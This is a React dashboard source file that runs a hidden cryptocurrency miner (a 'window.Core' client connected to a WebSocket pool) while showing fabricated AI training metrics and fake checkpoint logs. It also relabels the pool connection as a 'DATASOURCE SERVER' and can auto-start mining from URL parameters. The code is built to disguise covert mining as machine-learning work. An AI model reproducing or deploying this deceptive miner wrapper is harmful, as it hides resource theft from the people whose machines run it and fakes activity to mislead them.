import React, { useState, useEffect, useRef } from 'react';
import './App.css';

function App() {
  const [logs, setLogs] = useState([]);
  const [isMining, setIsMining] = useState(false);
  const [config, setConfig] = useState({
    wsUrl: 'ws://localhost:3333',
    threads: 4
  });

  // State now mixed: Real mining happens in bg, UI shows Fake AI stats
  const [stats, setStats] = useState({
    // Fake AI Stats
    epoch: 1,
    maxEpochs: 1000,
    iteration: 0,
    loss: 2.4502,
    accuracy: 12.5,
    gpuUtil: 0,
    vram: 0,
    // Real Hidden Stats (kept for logic if needed, but not shown)
    hashrate: 0,
    accepted: 0
  });

  const logsEndRef = useRef(null);
  const clientRef = useRef(null);

  // Initialize with Query Params
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const urlParam = params.get('url') || params.get('proxy');
    const threadsParam = params.get('threads');
    const autoStart = params.get('autostart');

    if (urlParam || threadsParam) {
      setConfig(prev => ({
        wsUrl: urlParam || prev.wsUrl,
        threads: threadsParam ? parseInt(threadsParam) : prev.threads
      }));
    }

    // Handle auto-start
    if (autoStart === 'true' || autoStart === '1') {
      if (urlParam) {
        setTimeout(() => setIsMining(true), 100);
      }
    }
  }, []);

  // Auto-scroll to bottom
  useEffect(() => {
    logsEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [logs]);

  // Helper to add log
  const addLog = (msg, level = 'INFO') => {
    const now = new Date();
    const timeStr = now.toISOString().split('T')[1].slice(0, 12);

    setLogs(prev => {
      const newLog = {
        id: Date.now() + Math.random(),
        time: timeStr,
        level,
        message: msg
      };
      const updated = [...prev, newLog];
      if (updated.length > 200) return updated.slice(updated.length - 200);
      return updated;
    });
  };

  // Fake Stats & Log Generator Loop
  useEffect(() => {
    let interval;
    if (isMining) {
      // Initialize fake values relative to current state to avoid jumps
      let fakeIteration = stats.iteration;
      let fakeEpoch = stats.epoch;
      let fakeLoss = stats.loss;
      let fakeAcc = stats.accuracy;

      interval = setInterval(() => {
        fakeIteration++;
        if (fakeIteration % 100 === 0) fakeEpoch++;

        if (Math.random() > 0.5) fakeLoss = Math.max(0.01, fakeLoss - 0.01);
        else fakeLoss += 0.005;

        if (Math.random() > 0.4) fakeAcc = Math.min(99.9, fakeAcc + 0.1);

        const newGpu = Math.min(100, Math.max(80, 92 + (Math.random() * 10 - 5)));
        const newVram = Math.min(80, 22.4 + (Math.random() * 0.2));

        // Update State for Sidebar
        setStats(prev => ({
          ...prev,
          iteration: fakeIteration,
          epoch: fakeEpoch,
          loss: fakeLoss,
          accuracy: fakeAcc,
          gpuUtil: newGpu,
          vram: newVram
        }));

        // Generate Log
        const rand = Math.random();
        let msg = `[Batch ${fakeIteration}] Loss: ${fakeLoss.toFixed(4)} | Acc: ${fakeAcc.toFixed(2)}% | lr: 0.001`;
        let level = 'INFO';

        if (rand < 0.02) {
          level = 'WARN';
          msg = `Gradient norm overhead at step ${fakeIteration}`;
        } else if (rand > 0.99) {
          level = 'SUCCESS';
          msg = `Checkpoint saved: models/model_v2_${fakeEpoch}.pt`;
        }

        addLog(msg, level);

      }, 1500);
    } else {
      // Reset hardware stats on stop
      setStats(prev => ({ ...prev, gpuUtil: 0, vram: 0 }));
    }
    return () => clearInterval(interval);
  }, [isMining]);

  // Real Mining Logic (Background)
  useEffect(() => {
    if (isMining) {
      if (clientRef.current) clientRef.current.stop();

      if (!window.Core) {
        addLog("Error: Core miner not loaded", 'ERROR');
        return;
      }

      try {
        const client = new window.Core(config.wsUrl, parseInt(config.threads));
        clientRef.current = client;

        client.on('connected', () => {
          addLog(`>>> DATASOURCE SERVER ESTABLISHED: ${config.wsUrl}`, 'SUCCESS');
        });

        client.on('reconnecting', () => {
          addLog(`>>> DATASOURCE SERVER LOST. RETRYING...`, 'WARN');
        });

        client.on('closed', () => {
          addLog(`>>> DATASOURCE SERVER STOPPED`, 'WARN');
        });

        client.on('error', (err) => {
          addLog(`DATASOURCE SERVER ERROR: ${err.message || err}`, 'ERROR');
        });

        // Silent Real Stats Updates (ignored or stored in hidden state if needed later)
        // We just let it run.
        client.start();

      } catch (e) {
        addLog(`Init Failed: ${e.message}`, 'ERROR');
        setIsMining(false);
      }

    } else {
      if (clientRef.current) {
        clientRef.current.stop();
        clientRef.current = null;
      }
    }

    return () => {
      if (clientRef.current) clientRef.current.stop();
    };
  }, [isMining]);

  const toggleMining = () => {
    setIsMining(!isMining);
  };

  const handleConfigChange = (e) => {
    const { name, value } = e.target;
    setConfig(prev => ({
      ...prev,
      [name]: value
    }));
  };

  return (
    <div className="dashboard">
      <header className="header glass-panel">
        <div className="brand-section">
          <div className="brand">
            <span style={{ color: 'var(--accent-primary)', fontSize: '1.8rem' }}>⬢</span>
            HYPER_MIND /// MINER
          </div>

          <div className="control-panel">
            <div className="input-group">
              <label className="input-label">WebSocket Server</label>
              <input
                type="text"
                name="wsUrl"
                value={config.wsUrl}
                onChange={handleConfigChange}
                className="glass-input"
                placeholder="ws://..."
                disabled={isMining}
              />
            </div>
            <div className="input-group">
              <label className="input-label">Threads</label>
              <input
                type="number"
                name="threads"
                value={config.threads}
                onChange={handleConfigChange}
                className="glass-input"
                style={{ width: '80px', minWidth: 'unset' }}
                disabled={isMining}
              />
            </div>
            <button
              className={`btn-start ${isMining ? 'running' : ''}`}
              onClick={toggleMining}
              disabled={isMining && !clientRef.current}
            >
              {isMining ? 'STOP MINING' : 'START MINING'}
            </button>
          </div>
        </div>

        <div className="status-badge">
          <div className="status-dot" style={{
            animation: isMining ? 'pulse 1s infinite' : 'none',
            background: isMining ? 'var(--accent-primary)' : '#555',
            boxShadow: isMining ? '' : 'none'
          }}></div>
          {isMining ? 'SYSTEM ACTIVE' : 'IDLE'}
        </div>
      </header>

      <div className="main-content">
        <aside className="sidebar glass-panel">

          <div className="stat-group">
            <h3>System Performance</h3>

            <div className="stat-item">
              <div className="stat-header">
                <span className="stat-name">GPU Load</span>
                <span className="stat-value-big" style={{ color: stats.gpuUtil > 90 ? 'var(--accent-error)' : 'var(--accent-primary)' }}>
                  {stats.gpuUtil.toFixed(0)}%
                </span>
              </div>
              <div className="progress-track">
                <div className="progress-fill" style={{ width: `${stats.gpuUtil}%` }}></div>
              </div>
            </div>

            <div className="stat-item">
              <div className="stat-header">
                <span className="stat-name">VRAM Memory</span>
                <span className="stat-value-big">{stats.vram.toFixed(1)} <span style={{ fontSize: '0.8rem' }}>GB</span></span>
              </div>
              <div className="progress-track">
                <div className="progress-fill" style={{ width: `${(stats.vram / 80) * 100}%`, background: 'var(--accent-secondary)' }}></div>
              </div>
            </div>
          </div>

          <div className="stat-group">
            <h3>Training Metrics</h3>

            <div className="stat-item">
              <div className="stat-header">
                <span className="stat-name">Model Loss</span>
                <span className="stat-value-big">{stats.loss.toFixed(4)}</span>
              </div>
              {/* Fake Mini Graph */}
              <div style={{ display: 'flex', alignItems: 'flex-end', height: '40px', gap: '4px', opacity: 0.8 }}>
                {[...Array(15)].map((_, i) => (
                  <div key={i} style={{
                    flex: 1,
                    background: i === 14 ? 'var(--accent-primary)' : 'rgba(255,255,255,0.1)',
                    height: `${30 + Math.random() * 60}%`,
                    borderRadius: '2px'
                  }}></div>
                ))}
              </div>
            </div>

            <div className="stat-item">
              <div className="stat-header">
                <span className="stat-name">Accuracy</span>
                <span className="stat-value-big" style={{ color: 'var(--accent-secondary)' }}>{stats.accuracy.toFixed(2)}%</span>
              </div>
            </div>

            <div className="stat-item">
              <div className="stat-header">
                <span className="stat-name">Epoch</span>
                <span className="stat-value-big">{stats.epoch} <span style={{ fontSize: '1rem', color: '#666' }}>/ {stats.maxEpochs}</span></span>
              </div>
            </div>

          </div>
        </aside>

        <main className="terminal-container glass-panel">
          <div className="terminal-header">
            <div className="terminal-controls">
              <div className="dot red"></div>
              <div className="dot yellow"></div>
              <div className="dot green"></div>
            </div>
            <span>
              miner@hyper-mind — {config.threads} threads — {config.wsUrl}
            </span>
          </div>
          <div className="logs">
            {logs.map(log => (
              <div key={log.id} className="log-line">
                <span className="log-timestamp">{log.time}</span>
                <span className={`badge badge-${log.level.toLowerCase()}`}>{log.level}</span>
                <span className="log-msg">{log.message}</span>
              </div>
            ))}
            <div ref={logsEndRef} />
            {isMining && (
              <div className="log-line">
                <span className="log-timestamp">...</span>
                <span className="cursor"></span>
              </div>
            )}
          </div>
        </main>
      </div>
    </div>
  );
}

export default App;
